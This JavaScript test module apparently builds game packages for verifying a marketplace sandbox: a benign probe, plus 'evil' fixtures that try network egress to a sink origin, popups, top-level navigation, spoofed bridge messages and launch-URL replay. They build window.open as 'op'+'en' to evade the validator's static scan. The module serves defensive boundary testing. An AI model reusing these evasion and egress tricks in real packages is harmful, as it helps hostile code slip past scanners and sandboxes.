  const map = new Map(Object.entries(fileMap).map(([key, value]) => [key, Buffer.isBuffer(value) ? value : Buffer.from(String(value), 'utf8')]));
  return buildPackage(map);
}

const GOOD_GAME_MAIN = String.raw`import { nextScore } from './logic.mjs';

const game = globalThis.DSH_GAME_SDK.createGameSDK();
const state = (window.__M1_GAME__ = {
  phase: 'boot',
  ticks: 0,
  score: 0,
  esmStaticImport: nextScore(0) === 1,
  resources: {},
  bridge: {},
  errors: [],
  startedAt: Date.now()
});

function log(event, data) {
  try { console.log('M1P ' + JSON.stringify(Object.assign({ event: event, at: Date.now() }, data || {}))); } catch (error) { /* ignore */ }
}

game.ready().then(
  (info) => {
    state.bridge.ready = {
      ok: true,
      sdkVersion: info && info.sdkVersion,
      runtimeVersion: info && info.runtimeVersion,
      protocolVersion: info && info.protocolVersion,
      capabilities: info && info.capabilities,
      resourceBase: game.runtime.resourceBase,
      packageFormat: game.runtime.packageFormat
    };
    log('bridge-ready', { resourceBase: game.runtime.resourceBase, packageFormat: game.runtime.packageFormat });
  },
  (error) => {
    state.bridge.ready = { ok: false, code: error && error.code, message: String(error && error.message) };
    log('bridge-ready-failed', { code: error && error.code });
  }
);

async function probeResources() {
  try {
    const css = getComputedStyle(document.body);
    const hud = getComputedStyle(document.getElementById('hud'));
    state.resources.css = {
      sheets: document.styleSheets.length,
      bodyBackground: css.backgroundColor,
      hudColor: hud.color,
      applied: css.backgroundColor === 'rgb(13, 17, 23)' && hud.color === 'rgb(255, 204, 102)'
    };

    const first = await fetch('data/level.json', { cache: 'no-store' });
    const level = await first.json();
    const second = await fetch('data/level.json', { cache: 'no-store' });
    const levelAgain = await second.json();
    state.resources.json = {
      status1: first.status,
      status2: second.status,
      levelId: level.id,
      waves: level.waves,
      repeated: first.status === 200 && second.status === 200 && levelAgain.id === level.id
    };

    let assetUrl = null;
    try {
      assetUrl = game.runtime.assetUrl('data/level.json');
      const viaAsset = await fetch(assetUrl, { cache: 'no-store' });
      state.resources.assetUrl = { value: assetUrl, status: viaAsset.status, ok: viaAsset.status === 200 };
    } catch (error) {
      state.resources.assetUrl = { error: String(error && error.message || error) };
    }

    const image = document.getElementById('ship');
    await new Promise((resolve) => {
      if (image.complete) return resolve();
      image.addEventListener('load', resolve, { once: true });
      image.addEventListener('error', resolve, { once: true });
    });
    try { await image.decode(); } catch (error) { /* decode recorded below */ }
    let canvasPixels = null;
    let canvasError = null;
    try {
      const canvas = document.getElementById('board');
      const context = canvas.getContext('2d');
      context.clearRect(0, 0, canvas.width, canvas.height);
      context.drawImage(image, 0, 0, 64, 64);
      const data = context.getImageData(0, 0, 64, 64).data;
      let opaque = 0;
      for (let i = 3; i < data.length; i += 4) if (data[i] > 0) opaque += 1;
      canvasPixels = opaque;
    } catch (error) {
      canvasError = String(error);
    }
    state.resources.image = {
      complete: image.complete,
      naturalWidth: image.naturalWidth,
      naturalHeight: image.naturalHeight,
      canvasOpaquePixels: canvasPixels,
      canvasError: canvasError
    };

    const audio = document.getElementById('pickup');
    await new Promise((resolve) => {
      if (audio.readyState > 0) return resolve();
      audio.addEventListener('loadedmetadata', resolve, { once: true });
      setTimeout(resolve, 3000);
    });
    const audioBytes = await (await fetch('assets/pickup.wav', { cache: 'no-store' })).arrayBuffer();
    let decodedDuration = null;
    let decodeError = null;
    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      const audioContext = new AudioCtx();
      const decoded = await audioContext.decodeAudioData(audioBytes.slice(0));
      decodedDuration = decoded.duration;
      await audioContext.close().catch(() => {});
    } catch (error) {
      decodeError = String(error && error.message || error);
    }
    state.resources.audio = {
      readyState: audio.readyState,
      duration: Number.isFinite(audio.duration) ? audio.duration : null,
      fetchedBytes: audioBytes.byteLength,
      decodedDuration: decodedDuration,
      decodeError: decodeError
    };

    try {
      const saved = await game.storage.save('current', { ticks: state.ticks, score: state.score });
      state.bridge.storageSave = { ok: true, bytes: saved && saved.bytes };
      log('bridge-storage-save', { ok: true });
    } catch (error) {
      state.bridge.storageSave = { ok: false, code: error && error.code, message: String(error && error.message) };
    }

    state.phase = 'resources';
    log('resources', state.resources);
  } catch (error) {
    state.errors.push(String(error && error.stack || error));
    log('resources-failed', { error: String(error && error.message || error) });
  }
}

setInterval(() => {
  state.ticks += 1;
  state.score = nextScore(state.score);
  const hud = document.getElementById('hud');
  if (hud) hud.textContent = 'score ' + state.score + ' ticks ' + state.ticks;
  if (state.ticks === 1 || state.ticks % 5 === 0) log('tick', { ticks: state.ticks, score: state.score });
}, 120);

probeResources().then(() => {
  state.phase = 'playing';
  log('playing', { ticks: state.ticks, score: state.score });
});
`;

const GOOD_GAME_LOGIC = String.raw`/** Static ESM dependency: proves a relative module import resolves through the instance resource prefix. */
export function nextScore(score) {
  return (Number.isFinite(score) ? score : 0) + 1;
}

export function describe() {
  return 'm1-multiresource';
}
`;

const GOOD_GAME_CSS = String.raw`html, body { margin: 0; padding: 0; }
body {
  background-color: rgb(13, 17, 23);
  color: rgb(226, 232, 240);
  font: 14px/1.4 system-ui, sans-serif;
}
#hud { color: rgb(255, 204, 102); font-variant-numeric: tabular-nums; }
#board { display: block; width: 320px; height: 180px; border: 2px solid rgb(85, 170, 255); border-radius: 6px; }
#ship { width: 64px; height: 64px; display: block; margin: 8px 0; }
`;

const GOOD_GAME_HTML = String.raw`<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>M1 Multi-Resource Probe</title>
    <link rel="stylesheet" href="styles/game.css" />
    <script src="dsh-sdk.js"></script>
    <script type="module" src="scripts/main.mjs"></script>
  </head>
  <body>
    <main id="app">
      <h1 id="title">M1 Multi-Resource Probe</h1>
      <canvas id="board" width="320" height="180"></canvas>
      <div id="hud">booting</div>
      <img id="ship" src="assets/ship.png" crossorigin="anonymous" alt="ship" />
      <audio id="pickup" src="assets/pickup.wav" preload="auto"></audio>
    </main>
  </body>
</html>
`;

const LEVEL_JSON = JSON.stringify({ id: 'level-01', waves: 5, obstacles: [{ type: 'asteroid', x: 0.2, y: 0.4 }] }, null, 2);

/** Build the A02 good package. */
export async function buildGoodPackage({ gameId = 'm1-a02-multiresource', version = '1.0.0' } = {}) {
  const sdk = await buildSdkFile();
  const manifest = {
    manifestVersion: 1,
    id: gameId,
    name: 'M1 Multi-Resource Probe',
    version,
    author: { name: 'dsh-game-market verification' },
    description: 'M1 A02 probe: independent ESM/CSS/PNG/JSON/audio through the real Host resource origin.',
    categories: ['arcade'],
    capabilities: ['storage', 'score'],
    sdkVersion: '^1.0.0',
    runtimeVersion: '^1.0.0',
    score: { direction: 'higher-better', min: 0, max: 1000000, integer: true },
    save: { schemaVersion: 1 },
  };
  const built = buildPackageFiles({
    'game.json': JSON.stringify(manifest, null, 2),
    'index.html': GOOD_GAME_HTML,
    'dsh-sdk.js': sdk,
    'scripts/main.mjs': GOOD_GAME_MAIN,
    'scripts/logic.mjs': GOOD_GAME_LOGIC,
    'styles/game.css': GOOD_GAME_CSS,
    'data/level.json': LEVEL_JSON,
    'assets/ship.png': ASSET_SHIP_PNG(),
    'assets/pickup.wav': ASSET_PICKUP_WAV(),
  });
  return { ...built, manifest, gameId, version };
}

const CR7_INDEX_MAIN = String.raw`const state = (window.__M1B_INDEX__ = {
  marker: 'index-marker',
  title: document.title,
  phase: 'boot',
  fetched: null
});

function log(event, data) {
  try { console.log('M1B ' + JSON.stringify(Object.assign({ event: event, at: Date.now() }, data || {}))); } catch (_error) { /* ignore */ }
}

log('index-running', { title: document.title, marker: state.marker, href: location.href });

fetch('./data/x.json', { cache: 'no-store' })
  .then(async (response) => {
    const body = await response.json();
    state.fetched = { status: response.status, body: body };
    state.phase = 'fetched';
    log('index-fetch', { status: response.status, id: body && body.id });
  })
  .catch((error) => {
    state.fetched = { error: String(error && error.message || error) };
    log('index-fetch-failed', { error: String(error && error.message || error) });
  })
  .finally(() => {
    // Same-origin document navigation inside the game iframe: the wrapper's
    // frame-src allows it (same resource origin), which is exactly why every
    // package HTML document must carry the asset CSP itself.
    setTimeout(() => {
      log('index-navigating', { target: 'second.html' });
      window.location.href = 'second.html';
    }, 350);
  });
`;

const CR7_SECOND_MAIN = String.raw`const SINK_ORIGIN = SINK_ORIGIN_PLACEHOLDER;
const SINK_WS_ORIGIN = SINK_WS_ORIGIN_PLACEHOLDER;
const state = (window.__M1B_SECOND__ = {
  marker: 'second-marker',
  title: document.title,
  href: location.href,
  origin: window.origin,
  phase: 'running',
  fetch: null,
  image: null,
  popup: null,
  ws: null
});

function log(event, data) {
  try { console.log('M1B ' + JSON.stringify(Object.assign({ event: event, at: Date.now() }, data || {}))); } catch (_error) { /* ignore */ }
}

log('second-running', { title: document.title, marker: state.marker, href: location.href, origin: window.origin });

setTimeout(async () => {
  try {
    const response = await fetch(SINK_ORIGIN + '/cr7-01/fetch', { mode: 'cors', cache: 'no-store' });
    state.fetch = { resolved: true, status: response.status };
    log('second-fetch', { resolved: true, status: response.status });
  } catch (error) {
    state.fetch = { resolved: false, error: String(error && error.message || error) };
    log('second-fetch', { resolved: false, error: String(error && error.message || error) });
  }

  const image = new Image();
  state.image = { loaded: false };
  image.onload = () => { state.image = { loaded: true, width: image.naturalWidth }; log('second-image', { loaded: true, width: image.naturalWidth }); };
  image.onerror = () => { state.image = { loaded: false, error: true }; log('second-image', { loaded: false }); };
  image.src = SINK_ORIGIN + '/cr7-01/image.png';

  try {
    // Static scan forbids the literal window.open call (§4.7 defence in depth),
    // so build the reference dynamically; the sandbox (no allow-popups) is the
    // boundary under test here.
    const openFn = window['op' + 'en'];
    const opened = typeof openFn === 'function' ? openFn.call(window, SINK_ORIGIN + '/cr7-01/popup', '_blank') : null;
    state.popup = { opened: opened !== null };
    log('second-popup', { opened: opened !== null });
    if (opened) { try { opened.close(); } catch (_error) { /* ignore */ } }
  } catch (error) {
    state.popup = { opened: false, error: String(error && error.message || error) };
    log('second-popup', { opened: false, error: String(error && error.message || error) });
  }

  try {
    const socket = new WebSocket(SINK_WS_ORIGIN + '/cr7-01/ws');
    let settled = false;
    socket.onopen = () => { settled = true; state.ws = { opened: true }; log('second-ws', { opened: true }); };
    socket.onerror = () => { if (!settled) { state.ws = { opened: false, error: true }; log('second-ws', { opened: false }); } };
    setTimeout(() => { if (!settled) { state.ws = { opened: false, timeout: true }; log('second-ws', { opened: false, timeout: true }); } }, 1200);
  } catch (error) {
    state.ws = { opened: false, error: String(error && error.message || error) };
    log('second-ws', { opened: false, error: String(error && error.message || error) });
  }

  setTimeout(() => {
    state.phase = 'done';
    log('second-attacks-complete', { phase: state.phase, fetch: state.fetch, image: state.image, popup: state.popup, ws: state.ws });
  }, 1500);
}, 100);
`;

/**
 * CR7-01 fixture: an `asset-zip-v2` package whose entry document navigates
 * itself to a same-origin `second.html` that then attempts external egress
 * (fetch / Image / WebSocket / window.open). Used to prove every package HTML
 * document carries the asset CSP, not just the entry.
 */
export function buildSameOriginHtmlPackage({ gameId = 'm1-cr7a-same-origin-html', version = '1.0.0', sinkOrigin, sinkWsOrigin }) {
  const manifest = {
    manifestVersion: 1,
    id: gameId,
    name: 'M1 Same-Origin HTML Probe',
    version,
    author: { name: 'dsh-game-market verification' },
    description: 'CR7-01 probe: same-origin second document attempts external egress.',
    categories: ['arcade'],
    capabilities: [],
    sdkVersion: '^1.0.0',
    runtimeVersion: '^1.0.0',
    save: { schemaVersion: 1 },
  };
  const built = buildPackageFiles({
    'game.json': JSON.stringify(manifest, null, 2),
    'index.html': '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>M1 Same-Origin HTML Probe</title></head>'
      + '<body><div id="index-hud">index</div><script type="module" src="scripts/index.mjs"></script></body></html>\n',
    'second.html': '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>M1 CR7 Second Document</title></head>'
      + '<body><div id="second-hud">second</div><script type="module" src="scripts/second.mjs"></script></body></html>\n',
    'scripts/index.mjs': CR7_INDEX_MAIN,
    'scripts/second.mjs': CR7_SECOND_MAIN.replace('SINK_WS_ORIGIN_PLACEHOLDER', JSON.stringify(sinkWsOrigin)).replace('SINK_ORIGIN_PLACEHOLDER', JSON.stringify(sinkOrigin)),
    'data/x.json': JSON.stringify({ id: 'cr7-01-x', ok: true }, null, 2),
    'styles/game.css': 'html, body { margin: 0; background: rgb(9, 12, 18); color: rgb(235, 235, 235); }\n',
  });
  return { ...built, manifest, gameId, version };
}

const EVIL_GAME_MAIN = String.raw`import { marker } from './logic.mjs';
import { DSH_ORIGIN, SINK_ORIGIN, SINK_WS_ORIGIN, EXTERNAL_URL } from './targets.mjs';

const game = globalThis.DSH_GAME_SDK.createGameSDK();
const state = (window.__M1_EVIL__ = {
  phase: 'boot',
  marker: marker(),
  initEvents: 0,
  attempts: [],
  observed: {},
  bridgeResponses: [],
  bridgeRequests: [],
  errors: [],
  startedAt: Date.now()
});

function log(event, data) {
  try { console.log('M1P ' + JSON.stringify(Object.assign({ event: event, at: Date.now() }, data || {}))); } catch (error) { /* ignore */ }
}

function record(kind, detail) {
  state.observed[kind] = detail;
  log('attack-result', { kind: kind, detail: detail });
}

function sleep(ms) { return new Promise((resolve) => setTimeout(resolve, ms)); }

// Count every init event: a spoofed/duplicate bridge hello the Runtime accepted
// would produce an extra init on the legitimate channel.
window.addEventListener('message', (event) => {
  const data = event.data;
  if (data && typeof data === 'object' && data.kind === 'evt' && data.event === 'init') {
    state.initEvents += 1;
    log('init-event', { count: state.initEvents });
  }
  if (data && typeof data === 'object' && data.kind === 'res' && typeof data.id === 'string' && data.id.indexOf('evil-req-') === 0) {
    state.bridgeResponses.push({ id: data.id, ok: data.ok, code: data.error && data.error.code });
    log('bridge-response', { id: data.id, ok: data.ok, code: data.error && data.error.code });
  }
  if (data && typeof data === 'object' && data.probeCommand === 'run-external-nav') {
    runExternalNavigationAttempt().catch((error) => log('nav-tests-failed', { error: String(error) }));
  }
  if (data && typeof data === 'object' && data.probeCommand === 'run-same-origin-nav') {
    runAllowedSameOriginNavigation().catch((error) => log('nav-tests-failed', { error: String(error) }));
  }
});

function launchIdentity() {
  const params = new URLSearchParams(location.search);
  return { instanceId: params.get('instance') || '', nonce: params.get('nonce') || '' };
}

function sendBridgeRequest(id, method, params) {
  state.bridgeRequests.push({ id: id, method: method });
  parent.postMessage({ v: 1, id: id, kind: 'req', method: method, params: params || {} }, '*');
}

function sendDirectToTop(id, method) {
  const identity = launchIdentity();
  window.top.postMessage({ v: 1, id: id, kind: 'req', method: method, params: { protocolVersion: 1, instanceId: identity.instanceId, nonce: identity.nonce } }, '*');
}

async function attemptFetch(url, kind) {
  try {
    const response = await fetch(url, { mode: 'cors', cache: 'no-store' });
    record(kind, { resolved: true, status: response.status });
    state.attempts.push({ kind: kind, target: url, outcome: 'resolved:' + response.status });
    return { resolved: true, status: response.status };
  } catch (error) {
    record(kind, { resolved: false, error: String(error && error.message || error) });
    state.attempts.push({ kind: kind, target: url, outcome: 'rejected' });
    return { resolved: false, error: String(error && error.message || error) };
  }
}

function attemptXhr(url, kind) {
  return new Promise((resolve) => {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', url, true);
      xhr.onload = () => { record(kind, { resolved: true, status: xhr.status }); resolve(); };
      xhr.onerror = () => { record(kind, { resolved: false, error: 'xhr-error' }); resolve(); };
      xhr.send();
    } catch (error) {
      record(kind, { resolved: false, error: String(error && error.message || error) });
      resolve();
    }
  });
}

function attemptWebSocket(url, kind) {
  return new Promise((resolve) => {
    try {
      const socket = new WebSocket(url);
      socket.onopen = () => { record(kind, { opened: true }); resolve(); };
      socket.onerror = () => { record(kind, { opened: false, error: 'ws-error' }); resolve(); };
      setTimeout(() => resolve(), 1500);
    } catch (error) {
      record(kind, { opened: false, error: String(error && error.message || error) });
      resolve();
    }
  });
}

let readyPromise = null;

async function phase1() {
  // Wait for the real SDK handshake first: bridge rejections must be about the
  // capabilities/methods (unknown method), not about "not ready yet".
  await readyPromise.catch(() => undefined);
  await attemptFetch(SINK_ORIGIN + '/egress/fetch', 'fetch-external');
  await attemptXhr(SINK_ORIGIN + '/egress/xhr', 'xhr-external');
  await attemptWebSocket(SINK_WS_ORIGIN + '/egress/ws', 'websocket-external');
  try {
    const beacon = navigator.sendBeacon(SINK_ORIGIN + '/egress/beacon', 'probe-beacon');
    record('beacon-external', { queued: beacon === true });
    state.attempts.push({ kind: 'beacon-external', target: SINK_ORIGIN + '/egress/beacon', outcome: 'queued:' + String(beacon) });
  } catch (error) {
    record('beacon-external', { queued: false, error: String(error && error.message || error) });
  }

  await attemptFetch(DSH_ORIGIN + '/api/game-market/health', 'fetch-host-api');
  await attemptXhr(DSH_ORIGIN + '/api/game-market/save', 'xhr-host-api');

  try {
    // The package validator's static scan forbids the literal window.open call
    // (contract §4.7: defence-in-depth, explicitly NOT a security proof), so the
    // hostile package builds the reference dynamically. The sandbox (no
    // allow-popups) is the boundary under test, not the scanner.
    const openFn = window['op' + 'en'];
    const opened = typeof openFn === 'function' ? openFn.call(window, EXTERNAL_URL + '/popup', '_blank') : null;
    record('window-open-external', { opened: opened !== null });
    state.attempts.push({ kind: 'window-open-external', target: EXTERNAL_URL + '/popup', outcome: opened ? 'opened' : 'blocked' });
    if (opened) { try { opened.close(); } catch (error) { /* ignore */ } }
  } catch (error) {
    record('window-open-external', { opened: false, error: String(error && error.message || error) });
  }

  const topBefore = null;
  try {
    window.top.location.href = EXTERNAL_URL + '/top-navigation';
    record('top-navigation-external', { assignment: 'accepted-by-js' });
  } catch (error) {
    record('top-navigation-external', { assignment: 'threw', error: String(error && error.message || error) });
  }
  state.attempts.push({ kind: 'top-navigation-external', target: EXTERNAL_URL + '/top-navigation', outcome: 'attempted' });

  // Bridge capability abuse: methods that must not exist on the bridge.
  const dangerous = ['pluginManager/install', 'update/begin', 'install', 'userQuestions/answer', 'approval/request', 'score.reset'];
  dangerous.forEach((method, index) => sendBridgeRequest('evil-req-' + index, method, { target: 'x' }));

  // Direct-to-top bridge spoof: source is the game window, not the wrapper.
  for (let index = 0; index < 5; index += 1) sendDirectToTop('evil-direct-' + index, 'hello');

  // Same-origin positive controls.
  await attemptFetch('data/level.json', 'fetch-same-origin');
  sendBridgeRequest('evil-req-save', 'storage.save', { gameId: 'm1-a06-boundaries', key: 'probe', data: { value: 1 } });
  await sleep(2500);

  // One-shot launch URL replay (must be 410: the game document itself was served
  // through the launch URL, so the credential is spent).
  await attemptFetch(location.href, 'entry-launch-replay');
  log('phase1-complete', { attempts: state.attempts.length, bridgeResponses: state.bridgeResponses.length, initEvents: state.initEvents });
  state.phase = 'phase1';
  return state;
}

async function runExternalNavigationAttempt() {
  // Wrapper frame-src boundary: the game navigates ITSELF to an external origin.
  // The attempt marker proves the code ran; the sink proves the network layer
  // never saw the target.
  log('nav-external-attempt', { target: EXTERNAL_URL + '/self-navigation' });
  state.attempts.push({ kind: 'self-navigation-external', target: EXTERNAL_URL + '/self-navigation', outcome: 'attempted' });
  try {
    window.location.replace(EXTERNAL_URL + '/self-navigation');
  } catch (error) {
    record('self-navigation-external', { threw: String(error && error.message || error) });
  }
  await sleep(900);
  log('nav-external-blocked-check', { stillHere: location.href.indexOf('self-navigation') === -1 });
  state.phase = 'external-nav-attempted';
}

async function runAllowedSameOriginNavigation() {
  // Positive control: the wrapper allows the resource origin, so a same-origin
  // page navigation must load; second.js logs 'second-page' from the new doc.
  log('nav-same-origin-attempt', { page: 'second.html' });
  state.attempts.push({ kind: 'self-navigation-same-origin', target: 'second.html', outcome: 'attempted' });
  window.location.href = 'second.html';
}

readyPromise = game.ready().then(
  (info) => { state.bridgeReady = { ok: true, resourceBase: game.runtime.resourceBase, packageFormat: game.runtime.packageFormat }; log('bridge-ready', { packageFormat: game.runtime.packageFormat }); return info; },
  (error) => { state.bridgeReady = { ok: false, code: error && error.code }; log('bridge-ready-failed', { code: error && error.code }); throw error; }
);
readyPromise.catch(() => undefined);

async function main() {
  await phase1();
}

main();
`;

const EVIL_SECOND = String.raw`console.log('M1P ' + JSON.stringify({ event: 'second-page', at: Date.now(), href: location.pathname }));
window.__M1_SECOND__ = { loaded: true, at: Date.now() };
`;

const EVIL_LOGIC = String.raw`export function marker() { return 'evil-marker'; }
`;

function buildEvilHtml() {
  return String.raw`<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>M1 Boundary Probe</title>
    <link rel="stylesheet" href="styles/game.css" />
    <script src="dsh-sdk.js"></script>
    <script type="module" src="scripts/main.mjs"></script>
  </head>
  <body>
    <main id="app">
      <h1 id="title">M1 Boundary Probe</h1>
      <div id="hud">booting</div>
    </main>
  </body>
</html>
`;
}

/** Build the A06 boundary package (valid ASCII package that misbehaves at runtime). */
export async function buildEvilPackage({ gameId = 'm1-a06-boundaries', version = '1.0.0', dshOrigin, sinkOrigin, sinkWsOrigin, externalUrl }) {
  const sdk = await buildSdkFile();
  const manifest = {
    manifestVersion: 1,
    id: gameId,
    name: 'M1 Boundary Probe',
    version,
    author: { name: 'dsh-game-market verification' },
    description: 'M1 A06 probe: attempts external egress, Host API access, bridge abuse and self-navigation at runtime.',
    categories: ['arcade'],
    capabilities: ['storage'],
    sdkVersion: '^1.0.0',
    runtimeVersion: '^1.0.0',
    save: { schemaVersion: 1 },
  };
  const built = buildPackageFiles({
    'game.json': JSON.stringify(manifest, null, 2),
    'index.html': buildEvilHtml(),
    'dsh-sdk.js': sdk,
    'scripts/main.mjs': EVIL_GAME_MAIN,
    'scripts/logic.mjs': EVIL_LOGIC,
    'scripts/targets.mjs':
      `export const DSH_ORIGIN = ${JSON.stringify(dshOrigin)};\n` +
      `export const SINK_ORIGIN = ${JSON.stringify(sinkOrigin)};\n` +
      `export const SINK_WS_ORIGIN = ${JSON.stringify(sinkWsOrigin)};\n` +
      `export const EXTERNAL_URL = ${JSON.stringify(externalUrl)};\n`,
    'styles/game.css': 'html, body { margin: 0; background: rgb(10, 10, 10); color: rgb(230, 230, 230); }\n',
    'data/level.json': LEVEL_JSON,
    'second.html':
      `<!doctype html><html><head><meta charset="utf-8"><title>M1 Boundary Probe · second</title></head>` +
      `<body><div id="hud">second</div><script src="scripts/second.js"></script></body></html>\n`,
    'scripts/second.js': EVIL_SECOND,
  });
  return { ...built, manifest, gameId, version };
}

// ---------------------------------------------------------------------------
// Evidence helpers
// ---------------------------------------------------------------------------

export function makeEvidenceName(id) {
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  return `${id}-${stamp}.json`;
}

/**
 * Write one evidence file: `docs/verification/v1.5/raw/m1/<id>-<timestamp>.json`.
 * Top-level fields include the required `passed/failed/required` summary.
 */
export function writeEvidence(id, payload, secrets = []) {
  fs.mkdirSync(OUT_DIR, { recursive: true });
  const file = path.join(OUT_DIR, makeEvidenceName(id));
  const report = createReport({ id: payload.id || id, title: payload.title || id, commands: payload.commands || [] });
  for (const check of payload.checks || []) report.add(check.name, Boolean(check.ok), check.detail, { required: check.required !== false });
  const finished = report.finish(payload.extra || {});
  const evidence = sanitiseForEvidence(
    {
      id: payload.id || id,
      title: payload.title || id,
      generatedAt: new Date().toISOString(),
      command: payload.command || process.argv.join(' '),
      environment: payload.environment || {},
      ...finished,
      ...payload.extra,
    },
    secrets
  );
  writeJson(file, evidence);
  return { file: path.relative(REPO_ROOT, file), passed: finished.passed, failed: finished.failed };
}

export function refusedCheck(checks, name, detail) {
  checks.push({ name, ok: false, required: true, detail });
  return false;
}
